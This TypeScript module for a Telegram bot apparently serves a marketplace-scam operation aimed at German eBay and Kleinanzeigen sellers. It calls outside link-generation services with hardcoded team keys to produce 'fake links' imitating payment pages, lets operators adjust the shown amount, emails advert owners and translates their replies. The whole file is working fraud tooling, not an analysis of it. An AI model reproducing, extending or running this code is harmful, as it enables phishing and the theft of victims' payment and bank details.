import { Composer, InlineKeyboard } from "grammy";
import type { CustomContext } from "../types";
import { UserRepo, AdvertsRepo, type TeamProvider } from "../db/queries";
import { translateToRussian } from "../utils/openAI";
import { db } from "../db";
import { adverts } from "../db/schema";
import { eq } from "drizzle-orm";
import axios from "axios";

import { EntitiesParser, RendererHtml } from "@qz/telegram-entities-parser";
import type {
  CommonEntity,
  RendererOutput,
  Message
} from "@qz/telegram-entities-parser/types";

const TEAM_KEY_TSUM = "7bc1926a-a6ca-46f1-811b-15a09c716c8a";
const TEAM_KEY_AQUA = "ece84721-615f-4364-837c-b615f635ecc8";
const API_HOST = "api.goo.network";

const axiosHttp = axios;

function pickTeamKey(team: TeamProvider): string {
  return team === "tsum" ? TEAM_KEY_TSUM : TEAM_KEY_AQUA;
}

export async function updatePrice(
  userId: number,
  fakeLink: string | null,
  price: string
): Promise<void> {
  console.log(`[updatePrice] Запрос: userId=${userId}, fakeLink=${fakeLink}, price=${price}`);

  let gagAdId: string | null = null;
  if (fakeLink) {
    const match = fakeLink.match(/\/get\/(\d+)$/);
    if (match && match[1]) {
      gagAdId = match[1];
      console.log(`[updatePrice] Извлечён GAG adId из fakeLink: ${gagAdId}`);
    } else {
      console.error(`[updatePrice] Не удалось извлечь adId из fakeLink: ${fakeLink}`);
    }
  }

  if (!gagAdId) {
    throw new Error("Не удалось извлечь GAG adId из fakeLink");
  }

  const res = await axiosHttp.post("https://imageoxo.com/dupdateprice", {
    userId: userId.toString(),
    adId: gagAdId,
    price: price,
  }, {
    headers: {
      "Content-Type": "application/json",
    },
    timeout: 30000,
  });

  console.log(`[updatePrice] Статус ответа: ${res.status}`);

  if (res.status !== 200) {
    const errorText = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
    console.error(`[updatePrice] Ошибка ${res.status}:`, errorText);
    throw new Error(`HTTP error ${res.status}: ${errorText}`);
  }

  console.log(`[updatePrice] Ответ API:`, res.data);
}

export async function generateLink(
  telegramId: number,
  apiKey: string,
  url: string,
  profileID: string,
  advertId?: number
): Promise<string> {

  const team = await UserRepo.getTeam(telegramId);

  if (team === "gag") {
    if (!advertId) {
      throw new Error("advertId необходим для команды GAG");
    }

    const advert = await db
      .select({
        title: adverts.title,
        price: adverts.price,
        photo: adverts.photo,
        personDotName: adverts.personDotName,
      })
      .from(adverts)
      .where(eq(adverts.id, advertId))
      .get();

    if (!advert) {
      throw new Error(`Объявление с ID ${advertId} не найдено`);
    }

    const address = await UserRepo.getAddress(telegramId);
    const buyerName = await UserRepo.getBuyerName(telegramId);

    console.log(`[GAG RedScript API] Запрос на создание ссылки для advertId=${advertId}, user=${telegramId}`);
    console.log(`[GAG RedScript API] Данные: name=${advert.title}, amount=${advert.price}, buyer=${buyerName}, address=${address}`);

    const requestBody: Record<string, unknown> = {
      access_token: apiKey,
      country: "Германия",
      type: "services",
      service: "Kleinanzeigen",
      version: "2.0",
      name: advert.title,
      amount: advert.price,
    };
    if (advert.photo && advert.photo !== "-") requestBody.image = advert.photo;
    if (buyerName && buyerName !== "-") requestBody.initials = buyerName;
    if (address && address !== "-") requestBody.address = address;

    let gagRes;
    try {
      console.log(`[GAG RedScript API] POST https://api.redscript.info/team/createAd`);
      gagRes = await axiosHttp.post("https://api.redscript.info/team/createAd", requestBody, {
        headers: { "Content-Type": "application/json; charset=UTF-8" },
        timeout: 45000,
      });
    } catch (err: any) {
      if (err.code === "ECONNABORTED" || err.message?.includes("timeout")) {
        console.error(`[GAG RedScript API] Таймаут запроса (45s)`);
        throw new Error("Таймаут запроса к RedScript API (45s). Проверьте соединение.");
      }
      throw err;
    }

    console.log(`[GAG RedScript API] Статус ответа: ${gagRes.status}`);
    const gagData = gagRes.data as { status: boolean; error?: string | null; result?: { link?: string; url?: string; [key: string]: unknown }; link?: string; url?: string; message?: string };

    if (!gagData.status) {
      const errMsg = gagData.error ?? JSON.stringify(gagData);
      console.error(`[GAG RedScript API] Ошибка API:`, errMsg);
      throw new Error(`RedScript API ошибка: ${errMsg}`);
    }

    const gagLink = gagData.result?.link ?? gagData.result?.url ?? gagData.link ?? gagData.url ?? gagData.message;
    if (!gagLink) {
      console.error(`[GAG RedScript API] Не найдена ссылка в ответе:`, gagData);
      throw new Error(`RedScript API не вернул ссылку: ${JSON.stringify(gagData)}`);
    }

    console.log(`[GAG RedScript API] Получена ссылка:`, gagLink);
    return gagLink;
  }

  const TEAM_KEY = pickTeamKey(team);

  const flags = await UserRepo.getFlags(telegramId);

  console.log(`[${team.toUpperCase()} API] Запрос на генерацию ссылки для url=${url}, profile=${profileID}`);
  console.log(`[${team.toUpperCase()} API] Target: https://${API_HOST}/api/generate/single/parse`);
  console.log(`[${team.toUpperCase()} API] Team key: ${TEAM_KEY}, API key: ${apiKey.slice(0, 15)}...`);

  try {
    console.log(`[${team.toUpperCase()} API] Starting request...`);
    const requestBody = {
      service: "ebay_de",
      url,
      isNeedBalanceChecker: false,
      profileID,
      ...(flags.giroMode ? { options: { isGiro: true } } : {}),
    };

    console.log(`[${team.toUpperCase()} API] Request body:`, JSON.stringify(requestBody).slice(0, 200));

    const headers = {
      Authorization: `Bearer ${apiKey}`,
      Host: API_HOST,
      "X-Team-Key": TEAM_KEY,
      "Content-Type": "application/json",
    };

    const res = await axiosHttp.post(`https://${API_HOST}/api/generate/single/parse`, requestBody, {
      headers,
      timeout: 30000,
    });

    const statusCode = res.status;
    const responseData = res.data as {
      status: boolean;
      message: string;
    };

    console.log(`[${team.toUpperCase()} API] Статус ответа: ${statusCode}`);

    if (statusCode !== 200) {
      const errorText = typeof responseData === 'string' ? responseData : JSON.stringify(responseData);
      console.error(`[${team.toUpperCase()} API] Ошибка ${statusCode}:`, errorText);
      throw new Error(`HTTP error ${statusCode}: ${errorText}`);
    }

    const { status, message } = responseData;

    console.log(`[${team.toUpperCase()} API] Ответ получен, status=${status}, message length=${message?.length || 0}`);

    if (!status) throw new Error("API вернул status=false");
    return message;
  } catch (err: any) {
    if (err.code === 'ECONNABORTED' || err.message?.includes('timeout')) {
      console.error(`[${team.toUpperCase()} API] Таймаут запроса (45s)`);
      throw new Error("Таймаут запроса к API (45s). Проверьте соединение и ключи.");
    }
    console.error(`[${team.toUpperCase()} API] Ошибка:`, err.message || err);
    throw err;
  }
}

const composer = new Composer<CustomContext>();

composer.callbackQuery(/^write-message:(\d+)$/, async (ctx) => {
  await ctx.conversation.exitAll();
  const id = ctx.match[1];
  await ctx.answerCallbackQuery();
  await ctx.conversation.enter("sendEmailConv", id);
});

composer.callbackQuery(/^edit-amount:(\d+)$/, async (ctx) => {
  await ctx.conversation.exitAll();
  const advertId = Number(ctx.match[1]);
  await ctx.answerCallbackQuery();

  if (ctx.session) {
    ctx.session.step = `await_edit_amount_${advertId}`;
  }

  await ctx.reply("Введите новую сумму для объявления (например: 129.99):");
});

composer.on("message:text", async (ctx, next) => {
  if (!ctx.session?.step) return next();

  const match = ctx.session.step.match(/^await_edit_amount_(\d+)$/);
  if (!match) {

    return next();
  }

  const advertId = Number(match[1]);
  const newPrice = ctx.message.text.trim();

  console.log(`[edit-amount] User ${ctx.from.id} updating advertId=${advertId} to price=${newPrice}`);

  if (!/^\d+(\.\d{1,2})?$/.test(newPrice)) {
    await ctx.reply("❌ Некорректный формат цены. Используйте формат: 129.99");
    return;
  }

  try {
    const team = await UserRepo.getTeam(ctx.from.id);
    console.log(`[edit-amount] Team: ${team}`);

    await AdvertsRepo.setPrice(advertId, newPrice);
    console.log(`[edit-amount] DB updated successfully`);

    if (team === "gag") {
      console.log(`[edit-amount] Calling updatePrice API for GAG`);

      const fakeLink = await AdvertsRepo.getFakeLinkByAdvertId(advertId);
      console.log(`[edit-amount] Got fakeLink: ${fakeLink}`);

      await updatePrice(ctx.from.id, fakeLink, newPrice);
      console.log(`[edit-amount] updatePrice API call completed`);
    }

    if (ctx.session) {
      ctx.session.step = "";
    }

    await ctx.reply(`✅ Цена успешно обновлена: ${newPrice}`);
  } catch (e: any) {
    console.error(`[edit-amount] Error:`, e);
    await ctx.reply(`❌ Ошибка при обновлении цены: ${e?.message ?? "неизвестная ошибка"}`);
  }
});

const gen = new Set<number>();

composer.callbackQuery(/^generate-link:(\d+)$/, async (ctx) => {
  await ctx.conversation.exitAll();
  const mailId = Number(ctx.match[1]);
  console.log(`[generate-link] Starting for mailId=${mailId}, user=${ctx.from.id}`);

  const { advertId, link } = await AdvertsRepo.getAdvertByMailId(mailId);
  console.log(`[generate-link] Got advertId=${advertId}, link=${link ? 'present' : 'null'}`);

  if (!advertId || !link) {
    console.log(`[generate-link] No advert/link, showing alert to user`);
    return ctx.answerCallbackQuery({
      text: "❌ Это сообщение устарело: почта, к которой оно относится, была удалена (например, как отлетевшая), поэтому её история и связь с объявлением стёрты. Кнопка на новых письмах должна работать как обычно.",
      show_alert: true,
    });
  }

  if (gen.has(advertId)) {
    console.log(`[generate-link] advertId=${advertId} already generating, skipping`);
    return ctx.answerCallbackQuery({
      text: "⏳ Ссылка всё ещё создаётся...",
      show_alert: true,
    });
  }
  gen.add(advertId);
  console.log(`[generate-link] Added advertId=${advertId} to generation queue`);

  const replyTo = ctx.callbackQuery.message!.message_id;

  const team = await UserRepo.getTeam(ctx.from.id);
  console.log(`[generate-link] User team=${team}`);

  await ctx.answerCallbackQuery({
    text: `⚙️ ${team.toUpperCase()} Создаём ссылку...`,
  });

  void (async () => {
    try {
      console.log(`[generate-link] Starting async link generation for advertId=${advertId}`);
      const team = await UserRepo.getTeam(ctx.from.id);

      let apiKey = "-";
      let profileId = "-";

      if (team === "gag") {
        apiKey = await UserRepo.getApiKey("gag", ctx.from.id);
        console.log(`[generate-link] Got GAG apiKey=${apiKey.slice(0, 10)}...`);
      } else {
        apiKey = await UserRepo.getApiKey(team, ctx.from.id);
        profileId = await UserRepo.getProfileId(team, ctx.from.id);
        console.log(`[generate-link] Got apiKey=${apiKey.slice(0, 10)}..., profileId=${profileId}`);
      }

      console.log(`[generate-link] Calling generateLink for advertId=${advertId}`);
      const fakeLink = await generateLink(ctx.from.id, apiKey, link, profileId, advertId);
      console.log(`[generate-link] Got fakeLink=${fakeLink}`);

      await AdvertsRepo.setFakeLink(advertId, fakeLink);
      console.log(`[generate-link] Saved fakeLink to DB for advertId=${advertId}`);

      const text = team === "gag"
        ? `🇩🇪 Объявления › eBay 2.0 ⌵

🔗 Ссылка: <code>${fakeLink}</code>`
        : `🇩🇪 Объявления › eBay 2.0 ⌵

🗂 Профиль (<code>${profileId}</code>) ⌵

🔗 Ссылка: <code>${fakeLink}</code>`;

      const keyboard = new InlineKeyboard().text("изменить сумму", `edit-amount:${advertId}`);

      console.log(`[generate-link] Sending result message for advertId=${advertId}`);
      await ctx.reply(text, {
        parse_mode: "HTML",
        reply_parameters: {
          message_id: replyTo,
          allow_sending_without_reply: true,
        },
        link_preview_options: { is_disabled: true },
        reply_markup: keyboard,
      });
      console.log(`[generate-link] Success for advertId=${advertId}`);
    } catch (e: any) {
      console.error(`[generate-link] Error for advertId=${advertId}:`, e);
      await ctx.reply(
        `❌ ${team.toUpperCase()} Ошибка: ${e?.message ?? "при генерации ссылки"}`
      );
    } finally {
      gen.delete(advertId);
      console.log(`[generate-link] Removed advertId=${advertId} from generation queue`);
    }
  })();
});

class MyRenderer extends RendererHtml {
  override expandableBlockquote(
    options: { text: string; entity: CommonEntity },
  ): RendererOutput {
    return {
      prefix: '<blockquote expandable>',
      suffix: "</blockquote>",
    };
  }
}

const entitiesParser = new EntitiesParser({ renderer: new MyRenderer() });
export const parse = (message: Message) => entitiesParser.parse({ message });

const translating = new Set<number>();

composer.callbackQuery(/^translate-message:(\d+)$/, async (ctx) => {
  await ctx.conversation.exitAll();
  const msg = ctx.callbackQuery.message!;
  const mailId = Number(ctx.match[1]);
  const text = await AdvertsRepo.getTextByMailId(mailId);
  if (!text) {
    return ctx.answerCallbackQuery({
      text: "❌ Текст для перевода не найден",
      show_alert: true,
    });
  }

  if (translating.has(mailId)) {
    return ctx.answerCallbackQuery({
      text: "⏳ Перевод всё ещё выполняется...",
      show_alert: true,
    });
  }
  translating.add(mailId);

  const baseHtml = parse(msg);

  const workingHtml = `${baseHtml}\n\n⏳ <i>Начинаю перевод...</i>`;
  await ctx.editMessageText(workingHtml, {
    parse_mode: "HTML",
    reply_markup: msg.reply_markup,
  });

  await ctx.answerCallbackQuery("🔤 Перевожу...");

  void (async () => {
    try {
      const translated = await translateToRussian(text);

      const escapedTranslated = translated
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');

      const doneHtml = `${baseHtml}\n\n<b>Перевод:</b>\n<blockquote expandable><code>${escapedTranslated}</code></blockquote>`;

      const kb = msg.reply_markup?.inline_keyboard ?? [];
      kb.shift();

      await ctx.editMessageText(doneHtml, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: kb },
      });
    } catch (e: any) {

      const failedHtml = workingHtml.replace(/\n\n⏳.*$/s, "");
      await ctx.editMessageText(failedHtml, {
        parse_mode: "HTML",
        reply_markup: msg.reply_markup,
      });

      await ctx.reply(
        `❌ Ошибка перевода: ${e?.message ?? "неизвестная ошибка"}`,
        {
          reply_parameters: {
            message_id: msg.message_id,
            allow_sending_without_reply: true,
          },
        }
      );
    } finally {
      translating.delete(mailId);
    }
  })();
});

export default composer;
